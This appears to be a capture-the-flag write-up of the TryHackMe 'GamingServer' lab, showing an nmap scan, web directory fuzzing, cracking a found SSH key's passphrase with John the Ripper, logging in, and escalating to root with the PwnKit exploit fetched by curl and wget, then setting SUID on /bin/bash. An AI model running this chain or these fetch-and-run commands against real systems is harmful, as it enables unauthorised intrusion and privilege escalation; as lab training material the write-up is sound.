---
tags:
title: GamingServer - Easy (THM)
permalink: /GamingServer-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmap_default 10.66.142.144
[i] Creating /workspace/Desktop/TryHackMe/GamingServer/nmap...
Starting Nmap 7.93 ( https://nmap.org ) at 2026-04-17 14:07 -03
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating Ping Scan at 14:07
Scanning 10.66.142.144 [4 ports]
Completed Ping Scan at 14:07, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:07
Completed Parallel DNS resolution of 1 host. at 14:07, 0.04s elapsed
Initiating SYN Stealth Scan at 14:07
Scanning 10.66.142.144 [1000 ports]
Discovered open port 80/tcp on 10.66.142.144
Discovered open port 22/tcp on 10.66.142.144
Increasing send delay for 10.66.142.144 from 0 to 5 due to 667 out of 1667 dropped probes since last increase.
Completed SYN Stealth Scan at 14:07, 0.44s elapsed (1000 total ports)
Initiating Service scan at 14:07
Scanning 2 services on 10.66.142.144
Completed Service scan at 14:07, 6.45s elapsed (2 services on 1 host)
NSE: Script scanning 10.66.142.144.
Initiating NSE at 14:07
Completed NSE at 14:07, 4.53s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 1.08s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Nmap scan report for 10.66.142.144
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 340efe0612673ea4ebab7ac4816dfea9 (RSA)
|   256 49611ef4526e7b2998db302d16edf48b (ECDSA)
|_  256 b860c45bb7b2d023a0c756595c631ec4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Initiating NSE at 14:07
Completed NSE at 14:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
           Raw packets sent: 1680 (73.896KB) | Rcvd: 1679 (67.164KB)
```

![[Pasted image 20260417140935.png]]

![[Pasted image 20260417141003.png]]

![[Pasted image 20260417141038.png]]

![[Pasted image 20260417141048.png]]

![[Pasted image 20260417141125.png]]

```bash
fuzz_dir http://gamingserver.thm

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://gamingserver.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Extensions       : .php .asp .txt .php.old .html .php.bak .bak .aspx
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

uploads                 [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 171ms]
about.php               [Status: 200, Size: 2213, Words: 94, Lines: 96, Duration: 170ms]
about.html              [Status: 200, Size: 1435, Words: 55, Lines: 67, Duration: 170ms]
index.html              [Status: 200, Size: 2762, Words: 241, Lines: 78, Duration: 171ms]
secret                  [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 166ms]
robots.txt              [Status: 200, Size: 33, Words: 3, Lines: 4, Duration: 167ms]
server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 168ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

![[Pasted image 20260417141331.png]]

```bash
[Apr 17, 2026 - 14:14:16 (-03)] exegol-thm GamingServer # ssh john@gamingserver.thm -i id_rsa
The authenticity of host 'gamingserver.thm (10.66.142.144)' can't be established.
ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'gamingserver.thm' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':

[Apr 17, 2026 - 14:14:20 (-03)] exegol-thm GamingServer # ssh2john.py id_rsa > hash
[Apr 17, 2026 - 14:14:27 (-03)] exegol-thm GamingServer # cat hash
id_rsa:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
```

```bash
j hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
letmein          (id_rsa)
1g 0:00:00:00 DONE (2026-04-17 14:14) 25.00g/s 14000p/s 14000c/s 14000C/s teiubesc..ganda
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
[Apr 17, 2026 - 14:15:00 (-03)] exegol-thm GamingServer # ssh john@gamingserver.thm -i id_rsa
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr 17 17:15:04 UTC 2026

  System load:  0.08              Processes:           140
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 41%               IP address for ens5: 10.66.142.144
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ la
.bash_history  .bash_logout  .bashrc  .cache  .config  .gnupg  .local  .profile  .ssh  .sudo_as_admin_successful  user.txt  .vim  .viminfo
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

```bash
https://github.com/ly4k/PwnKit
```

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
```

```bash
wget 192.168.210.140/PwnKit; chmod +x PwnKit
```

```bash
john@exploitable:/tmp$ ./PwnKit 'id'
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(john)
```

```bash
john@exploitable:/tmp$ ./PwnKit 'chmod u+s /bin/bash'
john@exploitable:/tmp$ bash -p
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

`~ Happy Hacking.`